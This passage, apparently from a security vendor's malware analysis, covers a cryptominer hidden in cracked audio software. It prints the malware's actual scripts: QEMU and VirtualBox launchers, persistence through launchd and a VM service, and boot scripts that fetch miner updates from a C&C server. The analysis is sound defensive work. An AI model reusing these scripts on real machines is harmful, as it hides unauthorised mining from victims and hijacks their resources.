class="crayon-st">then</span></div><div class="crayon-line" id="crayon-60a9a94431f5a690813014-5"><span class="crayon-e">launchctl </span><span class="crayon-v">unload</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchDaemons</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">AAAA</span><span class="crayon-sy">.</span><span class="crayon-e">plist</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5a690813014-6"><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-60a9a94431f5a690813014-7"><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">BBBB</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">M</span><span class="crayon-h"> </span><span class="crayon-v">accel</span><span class="crayon-o">=</span><span class="crayon-v">hvf</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">cpu </span><span class="crayon-v">host</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">Application</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-v">Support</span><span class="crayon-o">/</span><span class="crayon-v">CCCC</span><span class="crayon-o">/</span><span class="crayon-v">DDDD</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">display </span><span class="crayon-e">none</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5a690813014-8"><span class="crayon-i">fi</span></div><div class="crayon-line" id="crayon-60a9a94431f5a690813014-9"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5a690813014-10"><span class="crayon-v">start</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><em>Script 3. <span style="font-family: courier new, courier, monospace;">z1.daemon</span> shell script</em></p>
<p>Version 2 is a bit cleaner and/or simpler than version 1. There is only one QEMU image, with two copies made; same for the image launcher scripts, daemons and the <span style="font-family: courier new, courier, monospace;">cpumonitor</span>. Even though version 2 randomizes its filenames and directories, it can only be installed once because the installation checks for running processes with <span style="font-family: courier new, courier, monospace;">accel=hvf</span> in their command line.</p>
<p>From the version 2 applications we’ve checked so far, the SHA1 hash of the <span style="font-family: courier new, courier, monospace;">data_installer.pkg</span> is always <em>39a7e86368f0e68a86cce975fd9d8c254a86ed93</em>.</p>
<h3>Version 3</h3>
<p>The miner files are in an encrypted DMG file, called <span style="font-family: courier new, courier, monospace;">do.dmg</span>, inside the application package. The DMG is mounted with the following command:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f5c045796888" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
printf '%s\0' 'VeryEasyPass123!' | hdiutil attach -noverify /Users/Shared/instapack/do.dmg -stdinpass.</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f5c045796888-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f5c045796888-1"><span class="crayon-i">printf</span><span class="crayon-h"> </span><span class="crayon-s">'%s\0'</span><span class="crayon-h"> </span><span class="crayon-s">'VeryEasyPass123!'</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-e">hdiutil </span><span class="crayon-v">attach</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">noverify</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">Users</span><span class="crayon-o">/</span><span class="crayon-v">Shared</span><span class="crayon-o">/</span><span class="crayon-v">instapack</span><span class="crayon-o">/</span><span class="crayon-st">do</span><span class="crayon-sy">.</span><span class="crayon-v">dmg</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">stdinpass</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The miner DMG contains a single package: <span style="font-family: courier new, courier, monospace;">datainstallero.pkg</span>. This and the software package are then installed.</p>
<p>The package contents of <span style="font-family: courier new, courier, monospace;">datainstallero.pkg</span> and<span style="font-family: courier new, courier, monospace;"> data_installer.pkg</span> from version 2 are more or less the same, but <span style="font-family: courier new, courier, monospace;">datainstallero.pkg</span> adds two obfuscated scripts – <span style="font-family: courier new, courier, monospace;">clearpacko.sh</span> and <span style="font-family: courier new, courier, monospace;">installpacko.sh</span> &#8211; and obfuscates an existing script – <span style="font-family: courier new, courier, monospace;">randwd</span>:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">clearpacko.sh</span> removes version 1 of the miner like version 2 does.</li>
<li><span style="font-family: courier new, courier, monospace;">installpacko.sh</span> installs the miner the same way version 2 does, except the comments have been stripped from the script.</li>
</ul>
<p>The SHA1 of the <span style="font-family: courier new, courier, monospace;">do.dmg</span> remains the same as well: <em>b676fdf3ece1ac4f96a2ff3abc7df31c7b867fb9</em>.</p>
<h3>Launching the Linux image</h3>
<p>All versions use multiple shell scripts to launch the images. The shell scripts are executed by plists on boot and are kept alive.</p>
<ul>
<li>Version 1 executes the following binaries (copies of <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64</span><em>)</em> to launch the QEMU images: <span style="font-family: courier new, courier, monospace;">qemu-system-x86_64, system-monitor, tools-service</span><em>.</em></li>
<li>Versions 2 and 3 use the same command, but the filename of the binary, directory in <span style="font-family: courier new, courier, monospace;">Application Support</span> and the QEMU filename is randomized.</li>
</ul>
<p>All versions use the following switches:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">-M accel=hvf</span> to use the <a href="https://developer.apple.com/documentation/hypervisor" target="_blank" rel="noopener">Hypervisor</a> framework as an accelerator. HVF was introduced with OS X 10.10 and support for HVF was added in QEMU 2.12, which was released in April 2018.</li>
<li><span style="font-family: courier new, courier, monospace;">-display none</span> so the virtual machine runs without a graphical interface.</li>
</ul>
<p>Since the image is launched without specifying the amount of RAM and # of CPU cores, the default values are used: 1 CPU core and 128MB of RAM. All versions can launch 2 images.</p>
<h2>Windows (version 4)</h2>
<p>From the strings we extracted from the application, we define the only Windows version seen so far as version 4. As we mentioned earlier, the logic is quite similar to the macOS version. Each Windows application is packaged as an MSI installer that installs both the “cracked” application, and Figure 8 shows the trust popup for installing the VirtualBox driver when running a “cracked” VST installer from vstcrack[.]com.</p>
<div id="attachment_127022" style="width: 539px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/06/Figure-8-WM.png"><img class="wp-image-127022 size-full" src="/wp-content/uploads/2019/06/Figure-8-WM.png" alt="" width="529" height="421" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-8-WM.png 529w, https://www.welivesecurity.com/wp-content/uploads/2019/06/Figure-8-WM-300x239.png 300w" sizes="(max-width: 529px) 100vw, 529px" /></a><p class="wp-caption-text"><i>Figure 8. Trust popup for a VirtualBox driver when running the installation of an application from vstcrack[.]com</i></p></div>
<p>VirtualBox is installed in its usual folder name (<span style="font-family: courier new, courier, monospace;">C:\Program Files\Oracle</span>); however, the attributes of the directory are set to “hidden”. Then the installer copies the Linux image and <a href="http://vboxvmservice.sourceforge.net/" target="_blank" rel="noopener">VBoxVmService</a> (a Windows service used to run a VirtualBox virtual machine as a service) into <span style="font-family: courier new, courier, monospace;">C:\vms</span>, which is also a hidden directory. Once the installation is complete, the installer runs a batch script compiled with <a href="https://bat2exe.net" target="_blank" rel="noopener">BAT2EXE</a> (see the unpacked listing in Script 4) to import the Linux image and run <span style="font-family: courier new, courier, monospace;">VmServiceControl.exe</span> to start the virtual machine as a service.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f5e949398275" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
@echo off
setlocal EnableExtensions EnableDelayedExpansion
"c:\Program Files\Oracle\VirtualBox\vboxmanage.exe" setproperty machinefolder "%userprofile%\appdata\roaming"
"c:\Program Files\Oracle\VirtualBox\vboxmanage.exe" import "c:\vms\tmp\sys00_1.ova"
xcopy /Y "C:\Windows\System32\Config\systemprofile\.VirtualBox" "C:\vms\.VirtualBox\"
"C:\vms\VmServiceControl.exe" -i
del /F "c:\vms\tmp\sys00_1.ova"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f5e949398275-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5e949398275-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f5e949398275-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5e949398275-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f5e949398275-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f5e949398275-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f5e949398275-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f5e949398275-1"><span class="crayon-sy">@</span><span class="crayon-e">echo </span><span class="crayon-e">off</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5e949398275-2"><span class="crayon-e">setlocal </span><span class="crayon-e">EnableExtensions </span><span class="crayon-i">EnableDelayedExpansion</span></div><div class="crayon-line" id="crayon-60a9a94431f5e949398275-3"><span class="crayon-s">"c:\Program Files\Oracle\VirtualBox\vboxmanage.exe"</span><span class="crayon-h"> </span><span class="crayon-e">setproperty </span><span class="crayon-i">machinefolder</span><span class="crayon-h"> </span><span class="crayon-s">"%userprofile%\appdata\roaming"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5e949398275-4"><span class="crayon-s">"c:\Program Files\Oracle\VirtualBox\vboxmanage.exe"</span><span class="crayon-h"> </span><span class="crayon-i">import</span><span class="crayon-h"> </span><span class="crayon-s">"c:\vms\tmp\sys00_1.ova"</span></div><div class="crayon-line" id="crayon-60a9a94431f5e949398275-5"><span class="crayon-v">xcopy</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">Y</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Windows\System32\Config\systemprofile\.VirtualBox"</span><span class="crayon-h"> </span><span class="crayon-s">"C:\vms\.VirtualBox\"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f5e949398275-6"><span class="crayon-s">"</span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">vms</span><span class="crayon-sy">\</span><span class="crayon-v">VmServiceControl</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">" -i</span></div><div class="crayon-line" id="crayon-60a9a94431f5e949398275-7"><span class="crayon-s">del /F "</span><span class="crayon-v">c</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">vms</span><span class="crayon-sy">\</span><span class="crayon-v">tmp</span><span class="crayon-sy">\</span><span class="crayon-v">sys00_1</span><span class="crayon-sy">.</span><span class="crayon-i">ova</span>"</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Script 4. Batch script used to run the Linux virtual machine as a service</em></p>
<p>This method is used to ensure the persistence of the miner after reboot. Indeed, VboxVmService comes with a configuration file (see Script 5) in which it is possible to enable the <span style="font-family: courier new, courier, monospace;">AutoStart</span> option so the virtual machine is automatically launched at startup.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f60372761779" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[Settings]
VBOX_USER_HOME=C:\vms\.VirtualBox
RunWebService=no
PauseShutdown=5000
[Vm0]
VmName=sys00_1
ShutdownMethod=acpipowerbutton
AutoStart=yes</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f60372761779-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f60372761779-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f60372761779-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f60372761779-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f60372761779-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f60372761779-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f60372761779-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f60372761779-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f60372761779-1"><span class="crayon-sy">[</span><span class="crayon-v">Settings</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f60372761779-2"><span class="crayon-v">VBOX_USER_HOME</span><span class="crayon-o">=</span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">vms</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-e">VirtualBox</span></div><div class="crayon-line" id="crayon-60a9a94431f60372761779-3"><span class="crayon-v">RunWebService</span><span class="crayon-o">=</span><span class="crayon-e">no</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f60372761779-4"><span class="crayon-v">PauseShutdown</span><span class="crayon-o">=</span><span class="crayon-cn">5000</span></div><div class="crayon-line" id="crayon-60a9a94431f60372761779-5"><span class="crayon-sy">[</span><span class="crayon-v">Vm0</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f60372761779-6"><span class="crayon-v">VmName</span><span class="crayon-o">=</span><span class="crayon-e">sys00_1</span></div><div class="crayon-line" id="crayon-60a9a94431f60372761779-7"><span class="crayon-v">ShutdownMethod</span><span class="crayon-o">=</span><span class="crayon-e">acpipowerbutton</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f60372761779-8"><span class="crayon-v">AutoStart</span><span class="crayon-o">=</span><span class="crayon-v">yes</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Script 5. Configuration file for VBoxVmService with <span style="font-family: courier new, courier, monospace;">AutoStart</span> enabled</em></p>
<p>The OVF file included in the Linux image describes the hardware configuration of the virtual machine (see Script 6): it uses 1GB of RAM and 2 CPU cores (with a maximum usage of 90%).</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f62829506528" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;Hardware&gt;
&lt;CPU count="2" executionCap="90"&gt;
&lt;PAE enabled="true"/&gt;
&lt;LongMode enabled="true"/&gt;
&lt;X2APIC enabled="true"/&gt;
&lt;HardwareVirtExLargePages enabled="true"/&gt;
&lt;/CPU&gt;
&lt;Memory RAMSize="1024"/&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f62829506528-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f62829506528-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f62829506528-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f62829506528-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f62829506528-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f62829506528-6">6</div><div class="crayon-num" data-line="crayon-60a9a94431f62829506528-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f62829506528-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f62829506528-1"><span class="crayon-o">&lt;</span><span class="crayon-v">Hardware</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f62829506528-2"><span class="crayon-o">&lt;</span><span class="crayon-e">CPU </span><span class="crayon-v">count</span><span class="crayon-o">=</span><span class="crayon-s">"2"</span><span class="crayon-h"> </span><span class="crayon-v">executionCap</span><span class="crayon-o">=</span><span class="crayon-s">"90"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9a94431f62829506528-3"><span class="crayon-o">&lt;</span><span class="crayon-e">PAE </span><span class="crayon-v">enabled</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f62829506528-4"><span class="crayon-o">&lt;</span><span class="crayon-e">LongMode </span><span class="crayon-v">enabled</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9a94431f62829506528-5"><span class="crayon-o">&lt;</span><span class="crayon-e">X2APIC </span><span class="crayon-v">enabled</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f62829506528-6"><span class="crayon-o">&lt;</span><span class="crayon-e">HardwareVirtExLargePages </span><span class="crayon-v">enabled</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9a94431f62829506528-7"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">CPU</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f62829506528-8"><span class="crayon-o">&lt;</span><span class="crayon-e">Memory </span><span class="crayon-v">RAMSize</span><span class="crayon-o">=</span><span class="crayon-s">"1024"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Script 6. Hardware configuration of the Linux image</em></p>
<h2>Linux image</h2>
<p>The Linux image is Tiny Core Linux 9.0 configured to run XMRig, as well as some files and scripts to keep the miner updated continuously. The most interesting files are:</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">/root/.ssh/{id_rsa, id_rsa.pub}</span> – the SSH pair key used to update the miner from the C&amp;C server using SCP.</li>
<li><span style="font-family: courier new, courier, monospace;">/opt/{bootsync.sh, bootlocal.sh}</span> – the system startup commands that try to update the miner from the C&amp;C server and run it (see Scripts 7 and 8):</li>
</ul>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f63326620876" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
/usr/bin/sethostname box
/opt/bootlocal.sh 2&gt;&amp;1 &gt; /dev/null &amp;
echo "booting" &gt; /etc/sysconfig/noautologin</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f63326620876-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f63326620876-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f63326620876-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f63326620876-1"><span class="crayon-o">/</span><span class="crayon-v">usr</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-e">sethostname </span><span class="crayon-v">box</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f63326620876-2"><span class="crayon-o">/</span><span class="crayon-v">opt</span><span class="crayon-o">/</span><span class="crayon-v">bootlocal</span><span class="crayon-sy">.</span><span class="crayon-i">sh</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span></div><div class="crayon-line" id="crayon-60a9a94431f63326620876-3"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"booting"</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">sysconfig</span><span class="crayon-o">/</span><span class="crayon-v">noautologin</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><em>Script 7. <span style="font-family: courier new, courier, monospace;">bootsync.sh</span></em></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9a94431f64568937860" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
/mnt/sda1/tools/bin/idgenerator 2&gt;&amp;1 &gt; /dev/null
/mnt/sda1/tools/bin/xmrig_update 2&gt;&amp;1 &gt; /dev/null
/mnt/sda1/tools/bin/ccommand_update 2&gt;&amp;1 &gt; /dev/null
/mnt/sda1/tools/bin/ccommand 2&gt;&amp;1 &gt; /dev/null
/mnt/sda1/tools/bin/xmrig</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9a94431f64568937860-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f64568937860-2">2</div><div class="crayon-num" data-line="crayon-60a9a94431f64568937860-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9a94431f64568937860-4">4</div><div class="crayon-num" data-line="crayon-60a9a94431f64568937860-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9a94431f64568937860-1"><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-i">idgenerator</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f64568937860-2"><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">xmrig</span><span class="crayon-sy">_</span>update<span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line" id="crayon-60a9a94431f64568937860-3"><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">ccommand</span><span class="crayon-sy">_</span>update<span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9a94431f64568937860-4"><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-i">ccommand</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line" id="crayon-60a9a94431f64568937860-5"><span class="crayon-o">/</span><span class="crayon-v">mnt</span><span class="crayon-o">/</span><span class="crayon-v">sda1</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">xmrig</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Script 8. <span style="font-family: courier new, courier, monospace;">bootlocal.sh</span></em></p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">/mnt/sda1/tools/bin</span> – main files and scripts used to update and run the miner.</li>
<li><span style="font-family: courier new, courier, monospace;">/mnt/sda1/tools/xmrig</span> – contains the source code of XMRig (from the GitHub <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener">repository</a>).</li>
</ul>
<p>The configuration of the miner is stored in <span style="font-family: courier new, courier, monospace;">/mnt/sda1/tools/bin/config.json</span> and contains mostly the domain name and the port used for the mining pool, which can differ depending on the version (see examples in the IoCs section).</p>
<p>The update mechanism is performed via SCP (Secure File Copy) by three different scripts:</p>
<ul>
